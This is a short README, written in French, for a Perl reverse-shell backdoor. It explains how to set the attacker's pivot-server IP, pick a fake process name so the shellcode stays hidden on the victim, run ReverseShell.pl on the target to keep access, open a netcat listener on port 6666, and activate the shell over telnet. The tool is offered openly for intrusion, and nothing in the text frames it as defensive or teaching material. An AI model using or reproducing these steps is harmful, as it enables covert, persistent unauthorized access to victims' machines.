# Misc-Tools

1) Modifier la valeur des variables suivantes:                                                                                    
  - $publicip --> contient l'ip publique de l'attaquant, à savoir celle du serveur rebond.
  - $fakeprocess --> n'importe quel processus identifié sur la cible afin de camoufler le shellcode.
  - $reverse_shell_port (6666) --> le port cible sur lequel se connecter pour piloter le shell, l'ouvrir ou le fermer.
  - $port (8700) --> Le port de la machine victime, sur lequel se connecter pour lançer l'activation du shellcode via la commande "shell".                                                                        
2) Le script ./ReverseShell.pl doit être exécuté sur le la cible afin de pouvoir maintenir l'accès sur la machine distante.       
3) Exécuter le listener sur votre machine: 'nc -l -p 6666' pour écouter la future connexion de la machine cible.              
4) Lancer la commande d'activation du revershell distant: 'telnet $ip_publique_machine $port' (à remplacer par le port défini dans le script --> 8700 dans notre cas).

Enjoy!
